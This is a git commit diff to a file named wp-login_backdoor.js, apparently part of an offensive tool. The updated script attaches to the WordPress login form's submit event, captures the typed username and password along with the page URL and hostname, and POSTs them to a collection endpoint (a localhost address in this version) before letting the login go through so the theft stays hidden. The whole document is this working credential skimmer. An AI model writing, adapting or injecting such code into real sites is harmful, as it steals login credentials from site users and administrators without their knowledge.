20158dde5d8d26dfbc51677d26ae8a4ee6a53bef
Nemo <72571614+0xNemo@users.noreply.github.com>
2026-02-19 13:22:59 +0100

    Update wp-login_backdoor.js

--- wp-login_backdoor.js
+++ wp-login_backdoor.js
@@ -1,22 +1,27 @@
-var login = document.getElementById("user_login").value;
-var passwd = document.getElementById("user_pass").value;
-var url = document.location.href;
-var origin = document.location.hostname;
+document.getElementById('loginform').addEventListener('submit', function(event) {
+    var login = document.getElementById("user_login").value;
+    var passwd = document.getElementById("user_pass").value;
+    var url = document.location.href;
+    var origin = document.location.hostname;
+    var server = "http://localhost:55000/data"
 
-alert('debug');
+    event.preventDefault();
 
-fetch("http://localhost:55000/data", {
-  method: "POST",
-  headers: {
-        'Content-Type': 'application/json',
-    },
-  body: JSON.stringify({
-    url: url,
-    user: login,
-    passw: passwd,
-    origin:origin
-  }),
-  headers: {
-    "Content-type": "application/json; charset=UTF-8"
-  }
+    fetch(server, {
+        method: "POST",
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            url: url,
+            user: login,
+            passw: passwd,
+            origin: origin
+        }),
+        headers: {
+            "Content-type": "application/json; charset=UTF-8"
+        }
+    }).then(response => {
+        event.target.submit();
+    });
 });
